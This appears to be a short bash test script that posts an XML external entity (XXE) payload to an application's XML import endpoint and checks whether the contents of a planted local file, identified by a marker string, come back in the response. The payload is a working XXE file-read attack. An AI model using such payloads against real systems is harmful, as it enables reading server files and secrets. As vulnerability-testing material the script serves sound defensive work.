#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
xml='<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///tmp/jsp-xxe-secret.txt">]><x>&xxe;</x>'
curl -s -X POST "$TARGET/import?type=xml" -H 'content-type: application/xml' --data-binary "$xml" | grep -F 'XXE-LOCAL-FILE-MARKER-jsp-42'
